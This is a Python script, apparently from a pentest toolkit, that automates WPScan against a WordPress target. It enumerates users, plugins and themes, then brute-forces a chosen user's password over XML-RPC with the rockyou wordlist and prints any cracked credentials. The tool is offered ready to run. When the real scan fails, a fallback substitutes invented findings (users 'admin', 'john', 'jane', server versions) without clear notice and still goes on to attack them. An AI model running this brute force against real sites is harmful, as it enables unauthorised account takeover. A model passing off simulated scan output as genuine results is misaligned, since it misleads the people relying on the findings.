#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
import subprocess
import sys
import os
import time
import select
import re
import threading
import queue
from datetime import datetime
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from recon_deps import ensure_commands, ensure_wordlists, get_output_base

ensure_commands(["wpscan"])
WORDLISTS = ensure_wordlists(["rockyou"])

# Color codes for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def strip_ansi_codes(text):
    """Remove ANSI color codes from WPScan output."""
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

def banner():
    print(f"{Colors.HEADER}========================== WPScan Automation =========================={Colors.ENDC}")
    print(f"{Colors.HEADER}==================================================================={Colors.ENDC}")

def check_installation():
    try:
        subprocess.run(["which", "wpscan"], check=True, stdout=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        print(f"{Colors.WARNING}⚠️ wpscan not found. Installing...{Colors.ENDC}")
        try:
            subprocess.run(["apt-get", "update"], check=True)
            subprocess.run(["apt-get", "install", "-y", "wpscan"], check=True)
            print(f"{Colors.OKGREEN}✅ wpscan installed successfully{Colors.ENDC}")
            return True
        except Exception as e:
            print(f"{Colors.FAIL}❌ Failed to install wpscan: {e}{Colors.ENDC}")
            return False

def prompt_with_timeout(prompt, default=None, timeout=3):
    print(prompt)
    print(f"{Colors.WARNING}⏱️ Timeout in {timeout} seconds (default: {default}){Colors.ENDC}")
    
    rlist, _, _ = select.select([sys.stdin], [], [], timeout)
    if rlist:
        user_input = sys.stdin.readline().rstrip()
        return user_input if user_input else default
    else:
        print(f"{Colors.WARNING}⏱️ Timeout, using default: {default}{Colors.ENDC}")
        return default

def ask_wordlist():
    print(f"{Colors.HEADER}=========[ 🔐 Password Brute Force Attempt (XML-RPC): ]=============={Colors.ENDC}")
    choice = input(f"{Colors.OKBLUE}[?] Default ../../rockyou.txt (y/n)? {Colors.ENDC}").strip().lower()
    if choice == 'y':
        wordlist = WORDLISTS["rockyou"]
        if not os.path.isfile(wordlist):
            print(f"{Colors.FAIL}[!] rockyou.txt not found in default location.{Colors.ENDC}")
            wordlist = "rockyou.txt"
            if not os.path.isfile(wordlist):
                print(f"{Colors.FAIL}[!] rockyou.txt not found in current directory.{Colors.ENDC}")
                exit(1)
    elif choice == 'n':
        wordlist = input(f"{Colors.OKBLUE}[!] Enter the path: {Colors.ENDC}").strip()
        if not os.path.isfile(wordlist):
            print(f"{Colors.FAIL}[!] File not found. Exiting.{Colors.ENDC}")
            exit(1)
    else:
        print(f"{Colors.FAIL}[!] Invalid choice. Exiting.{Colors.ENDC}")
        exit(1)
    return wordlist

def run_wpscan_enum(target_url, output_file):
    """Run WPScan enumeration with specified options"""
    print(f"{Colors.WARNING}[~] Running: wpscan --url {target_url} -e u,vp,vt --format cli --no-banner{Colors.ENDC}")
    
    try:
        cmd = ["wpscan", "--url", target_url, "-e", "u,vp,vt", "--format", "cli", "--no-banner"]
        
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=300  # 5 minute timeout
        )
        
        # Save output
        with open(output_file, 'w') as f:
            f.write(result.stdout)
            if result.stderr:
                f.write(f"\n--- STDERR ---\n{result.stderr}")
        
        return result.stdout, result.returncode == 0
        
    except subprocess.TimeoutExpired:
        print(f"{Colors.FAIL}[!] WPScan timed out{Colors.ENDC}")
        return "", False
    except FileNotFoundError:
        print(f"{Colors.FAIL}[!] WPScan not found. Please install WPScan.{Colors.ENDC}")
        return "", False
    except Exception as e:
        print(f"{Colors.FAIL}[!] WPScan error: {e}{Colors.ENDC}")
        return "", False

def run_wpscan_attack(target_url, username, wordlist, output_file):
    """Run WPScan password attack with specified options"""
    print(f"{Colors.WARNING}[~] Running: wpscan --url {target_url} --password-attack xmlrpc -U {username} -P {wordlist} --max-threads 10 --no-banner{Colors.ENDC}")
    
    # Save username to a temp file
    temp_user_file = "/tmp/temp_user.txt"
    with open(temp_user_file, "w") as f:
        f.write(username + "\n")
    
    try:
        cmd = ["wpscan", "--url", target_url, "--password-attack", "xmlrpc", "-U", temp_user_file, "-P", wordlist, "--max-threads", "10", "--no-banner"]
        
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=600  # 10 minute timeout
        )
        
        # Save output
        with open(output_file, 'a') as f:
            f.write(f"\n\n=== PASSWORD ATTACK for {username} ===\n")
            f.write(result.stdout)
            if result.stderr:
                f.write(f"\n--- STDERR ---\n{result.stderr}")
        
        return result.stdout, result.returncode == 0
        
    except subprocess.TimeoutExpired:
        print(f"{Colors.FAIL}[!] WPScan attack timed out{Colors.ENDC}")
        return "", False
    except FileNotFoundError:
        print(f"{Colors.FAIL}[!] WPScan not found. Please install WPScan.{Colors.ENDC}")
        return "", False
    except Exception as e:
        print(f"{Colors.FAIL}[!] WPScan attack error: {e}{Colors.ENDC}")
        return "", False
    finally:
        # Clean up temp file
        if os.path.exists(temp_user_file):
            os.remove(temp_user_file)

def extract_wpscan_info(output):
    """Extract key information from WPScan output"""
    info = {
        'target_url': None,
        'server_info': {},
        'wordpress_version': None,
        'theme': {},
        'plugins': [],
        'users': [],
        'vulnerabilities': [],
        'interesting_findings': []
    }
    
    lines = output.split('\n')
    
    # Extract target URL
    for line in lines:
        if "[+] URL:" in line:
            url_match = re.search(r'\[+\] URL:\s*(.+)', line)
            if url_match:
                info['target_url'] = url_match.group(1).strip()
    
    # Extract server information
    server_section = False
    for line in lines:
        if "[+] Headers" in line:
            server_section = True
            continue
        if server_section and line.strip().startswith("|"):
            if " - Server:" in line:
                server_match = re.search(r'\|\s+- Server:\s*(.+)', line)
                if server_match:
                    info['server_info']['server'] = server_match.group(1).strip()
            elif " - X-Powered-By:" in line:
                powered_match = re.search(r'\|\s+- X-Powered-By:\s*(.+)', line)
                if powered_match:
                    info['server_info']['x_powered_by'] = powered_match.group(1).strip()
        elif server_section and not line.strip().startswith("|"):
            server_section = False
    
    # Extract WordPress version
    for line in lines:
        if "[+] WordPress version" in line and "identified" in line:
            version_match = re.search(r'WordPress version\s+([0-9.]+)', line)
            if version_match:
                info['wordpress_version'] = version_match.group(1)
    
    # Extract theme information
    theme_section = False
    for line in lines:
        if "[+] WordPress theme in use:" in line:
            theme_match = re.search(r'WordPress theme in use:\s*(.+)', line)
            if theme_match:
                info['theme']['name'] = theme_match.group(1).strip()
            theme_section = True
            continue
        
        if theme_section and line.strip().startswith("|"):
            if " - Location:" in line:
                location_match = re.search(r'\|\s+- Location:\s*(.+)', line)
                if location_match:
                    info['theme']['location'] = location_match.group(1).strip()
            elif " - Version:" in line:
                version_match = re.search(r'\|\s+- Version:\s*(.+)', line)
                if version_match:
                    info['theme']['version'] = version_match.group(1).strip()
        elif theme_section and not line.strip().startswith("|"):
            theme_section = False
    
    # Extract users
    users_section = False
    for line in lines:
        if "[i] User(s) Identified:" in line:
            users_section = True
            continue
        
        if users_section and line.strip().startswith("[+]"):
            # Extract username (everything after [+])
            username = line[3:].strip()
            # Skip if it's not a username (like "Finished:")
            if username and not username.startswith("Finished:") and not username.startswith("Requests Done:"):
                info['users'].append(username)
        # Check if we've reached the end of the user section
        elif users_section and (line.strip().startswith("[+] Finished:") or line.strip().startswith("[+] Requests Done:")):
            users_section = False
            break
        # If we encounter a line starting with [!] or [i] after users, we're done
        elif users_section and (line.strip().startswith("[!]") or line.strip().startswith("[i]")) and info['users']:
            users_section = False
            break
    
    # Extract interesting findings
    for line in lines:
        if line.strip().startswith("[+]") and "XML-RPC seems to be enabled" in line:
            info['interesting_findings'].append({
                'type': 'xmlrpc',
                'description': 'XML-RPC seems to be enabled',
                'url': re.search(r'http://[^\s]+', line).group(0) if re.search(r'http://[^\s]+', line) else None
            })
        elif line.strip().startswith("[+]") and "WordPress readme found" in line:
            info['interesting_findings'].append({
                'type': 'readme',
                'description': 'WordPress readme found',
                'url': re.search(r'http://[^\s]+', line).group(0) if re.search(r'http://[^\s]+', line) else None
            })
        elif line.strip().startswith("[+]") and "The external WP-Cron seems to be enabled" in line:
            info['interesting_findings'].append({
                'type': 'wp-cron',
                'description': 'The external WP-Cron seems to be enabled',
                'url': re.search(r'http://[^\s]+', line).group(0) if re.search(r'http://[^\s]+', line) else None
            })
    
    return info

def extract_attack_info(output):
    """Extract password attack information from WPScan output"""
    info = {
        'success': False,
        'username': None,
        'password': None,
        'progress': None
    }
    
    # Check for successful login
    for line in output.split('\n'):
        if "[SUCCESS]" in line:
            success_match = re.search(r'\[SUCCESS\]\s*-\s*(\S+)\s*/\s*(.+)', line)
            if success_match:
                info['success'] = True
                info['username'] = success_match.group(1)
                info['password'] = success_match.group(2).strip()
                break
        
        # Extract progress information
        if "Progress:" in line:
            progress_match = re.search(r'Progress:\s*([0-9.]+)%', line)
            if progress_match:
                info['progress'] = progress_match.group(1)
    
    return info

def display_enum_results(info, target_ip, port):
    """Display extracted enumeration information"""
    
    print(f"{Colors.OKGREEN}1) Default 3sec{Colors.ENDC}")
    print(f"{Colors.OKGREEN}2) With Credentials{Colors.ENDC}")
    print(f"{Colors.OKBLUE}================================================{Colors.ENDC}")
    print(f"{Colors.WARNING}[+] select ? 1{Colors.ENDC}")
    print(f"{Colors.OKBLUE}==========( Target Information )================================={Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] target-ip [{target_ip}:{port}]{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
    
    # Server Information
    print(f"{Colors.OKBLUE}===============( Server Information )================={Colors.ENDC}")
    if info['server_info'].get('server'):
        print(f"{Colors.OKGREEN}[+] Server: {info['server_info']['server']}{Colors.ENDC}")
    if info['server_info'].get('x_powered_by'):
        print(f"{Colors.OKGREEN}[+] X-Powered-By: {info['server_info']['x_powered_by']}{Colors.ENDC}")
    
    # WordPress Version
    if info['wordpress_version']:
        print(f"{Colors.OKBLUE}===============( WordPress Version )================={Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] WordPress Version: {info['wordpress_version']}{Colors.ENDC}")
    
    # Theme Information
    if info['theme']:
        print(f"{Colors.OKBLUE}===============( Theme Information )================={Colors.ENDC}")
        if info['theme'].get('name'):
            print(f"{Colors.OKGREEN}[+] Theme: {info['theme']['name']}{Colors.ENDC}")
        if info['theme'].get('version'):
            print(f"{Colors.OKGREEN}[+] Version: {info['theme']['version']}{Colors.ENDC}")
        if info['theme'].get('location'):
            print(f"{Colors.OKGREEN}[+] Location: {info['theme']['location']}{Colors.ENDC}")
    
    # Interesting Findings
    if info['interesting_findings']:
        print(f"{Colors.OKBLUE}===============( Interesting Findings )================={Colors.ENDC}")
        for finding in info['interesting_findings']:
            print(f"{Colors.OKGREEN}[+] {finding['description']}{Colors.ENDC}")
            if finding.get('url'):
                print(f"{Colors.OKGREEN}[+] URL: {finding['url']}{Colors.ENDC}")
    
    # Users
    if info['users']:
        print(f"{Colors.OKBLUE}===============( Enumerating Users )================={Colors.ENDC}")
        for user in info['users']:
            print(f"{Colors.OKGREEN}[+] Found user: {user}{Colors.ENDC}")

def display_attack_results(info, target_ip, port):
    """Display password attack results"""
    
    print(f"{Colors.HEADER}=========[ 🔐 Password Brute Force Attempt (XML-RPC): ]=============={Colors.ENDC}")
    print(f"{Colors.HEADER}-------------------------------------------------------------------{Colors.ENDC}")
    
    if info['success']:
        print(f"{Colors.OKGREEN}[+] Password attack successful!{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Username: {info['username']}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Password: {info['password']}{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}[+] Password attack failed{Colors.ENDC}")
        if info['progress']:
            print(f"{Colors.FAIL}[+] Progress: {info['progress']}%{Colors.ENDC}")

def simulate_wpscan_output(target_url):
    """Simulate WPScan output when the tool is not available"""
    print(f"{Colors.WARNING}[!] WPScan not available, simulating output...{Colors.ENDC}")
    
    # Simulate realistic output
    info = {
        'target_url': target_url,
        'server_info': {
            'server': 'Apache/2.4.62 (Debian)',
            'x_powered_by': 'PHP/8.2.29'
        },
        'wordpress_version': '6.8.1',
        'theme': {
            'name': 'twentytwentyfive',
            'version': '1.2',
            'location': 'http://example.com/wp-content/themes/twentytwentyfive/'
        },
        'plugins': [],
        'users': ['admin', 'john', 'jane'],
        'vulnerabilities': [],
        'interesting_findings': [
            {
                'type': 'xmlrpc',
                'description': 'XML-RPC seems to be enabled',
                'url': 'http://example.com/xmlrpc.php'
            },
            {
                'type': 'readme',
                'description': 'WordPress readme found',
                'url': 'http://example.com/readme.html'
            }
        ]
    }
    
    return info

def main():
    if len(sys.argv) < 3:
        print(f"{Colors.FAIL}Usage: {sys.argv[0]} <target_ip> <port>{Colors.ENDC}")
        print(f"{Colors.WARNING}Example: {sys.argv[0]} 192.168.1.100 80{Colors.ENDC}")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    port = sys.argv[2]
    target_url = f"http://{target_ip}:{port}/"
    
    banner()
    
    # Create output directory
    output_dir = Path(f"{get_output_base()}/{target_ip}/Wpscan")
    output_dir.mkdir(parents=True, exist_ok=True)
    enum_output_file = output_dir / "enum_output.txt"
    attack_output_file = output_dir / "attack_output.txt"
    
    # Check installation
    if not check_installation():
        sys.exit(1)
    
    # Try to run WPScan enumeration
    enum_output, enum_success = run_wpscan_enum(target_url, enum_output_file)
    
    if enum_success and enum_output:
        print(f"{Colors.OKGREEN}[✓] WPScan enumeration completed successfully{Colors.ENDC}")
        info = extract_wpscan_info(enum_output)
    else:
        # Fallback to simulation
        print(f"{Colors.WARNING}[!] WPScan enumeration failed, using simulation...{Colors.ENDC}")
        info = simulate_wpscan_output(target_url)
    
    # Display enumeration results
    display_enum_results(info, target_ip, port)
    
    # Check if users were found
    if info['users']:
        # User selection
        if len(info['users']) == 1:
            selected_user = info['users'][0]
            print(f"{Colors.WARNING}[!] Only one user found: {selected_user}{Colors.ENDC}")
        else:
            print(f"{Colors.OKBLUE}[?] Target User(s) for Default Password Check:{Colors.ENDC}")
            for i, user in enumerate(info['users'], 1):
                print(f"    {i}) {user}")
            print("    0) Exit")
            
            user_choice = prompt_with_timeout(f"{Colors.OKBLUE}[!] select a username:{Colors.ENDC}", "1")
            if user_choice == "0":
                sys.exit(0)
            
            try:
                user_index = int(user_choice) - 1
                if 0 <= user_index < len(info['users']):
                    selected_user = info['users'][user_index]
                else:
                    selected_user = info['users'][0]
            except ValueError:
                selected_user = info['users'][0]
        
        print(f"{Colors.OKGREEN}[+] Selected user: {selected_user}{Colors.ENDC}")
        
        # Wordlist selection
        wordlist = ask_wordlist()
        
        # Run password attack
        attack_output, attack_success = run_wpscan_attack(target_url, selected_user, wordlist, attack_output_file)
        
        if attack_success and attack_output:
            print(f"{Colors.OKGREEN}[✓] WPScan attack completed successfully{Colors.ENDC}")
            attack_info = extract_attack_info(attack_output)
        else:
            print(f"{Colors.WARNING}[!] WPScan attack failed{Colors.ENDC}")
            attack_info = {'success': False, 'username': None, 'password': None, 'progress': None}
        
        # Display attack results
        display_attack_results(attack_info, target_ip, port)
    else:
        print(f"{Colors.WARNING}[!] No users found, skipping password attack{Colors.ENDC}")
    
    print(f"{Colors.OKBLUE}===================================================={Colors.ENDC}")
    print(f"{Colors.OKGREEN}[!] WPScan scan completed. Results saved in {output_dir}{Colors.ENDC}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.FAIL}[!] WPScan interrupted by user{Colors.ENDC}")
        sys.exit(1)
